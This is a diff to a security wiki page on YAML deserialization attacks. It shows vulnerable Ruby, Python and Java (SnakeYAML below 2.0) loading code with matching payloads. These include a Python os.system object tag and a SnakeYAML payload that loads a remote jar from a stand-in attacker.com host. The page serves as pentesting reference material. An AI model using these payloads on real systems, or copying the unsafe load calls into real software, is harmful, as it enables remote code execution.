@@ -20,13 +20,13 @@ A common target for this is a function that executes shell commands, where you c
 
 ### Ruby
 
-#### Vulnerable Function
-
+{% code title="Vulnerable Code" %}
 ```ruby
 require "yaml"
 
 YAML.load(File.read("data.yml"))
 ```
+{% endcode %}
 
 #### Payload (>2.7, [source](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/))
 
@@ -56,17 +56,52 @@ YAML.load(File.read("data.yml"))
 
 ### Python
 
-#### Vulnerable Function
-
+{% code title="Vulnerable Code" %}
 ```python
 from yaml import Loader, load
 
 deserialized = load(open('data.yml'), Loader=Loader)
 ```
+{% endcode %}
 
 #### Payload
 
+{% code title="data.yml" %}
 ```yaml
 !!python/object/apply:os.system
 - "id"
 ```
+{% endcode %}
+
+### Java - SnakeYAML (<2.0)
+
+{% embed url="https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471" %}
+Walkthrough of vulnerability as theory and exploitability
+{% endembed %}
+
+{% code title="Vulnerable Code" %}
+```java
+import org.yaml.snakeyaml.Yaml;
+
+Yaml yaml = new Yaml();
+FileInputStream fis = new FileInputStream("data.yml");
+Map<String, Object> parsed = yaml.load(fis);
+```
+{% endcode %}
+
+#### Payload
+
+{% code title="data.yml" %}
+```yaml
+some_var: !!javax.script.ScriptEngineManager [
+    !!java.net.URLClassLoader [[
+        !!java.net.URL ["http://attacker.com/payload.jar"]
+    ]]
+]
+```
+{% endcode %}
+
+`/payload.jar` file:
+
+1. [Explanation](https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471) (search "remote jar file")
+2. [Proof of Concept](https://github.com/jordyv/poc-snakeyaml) with `build.sh` script (change [`exec()`](https://github.com/jordyv/poc-snakeyaml/blob/master/src/pocsnakeyaml/PocScriptEngineFactory.java#L18))
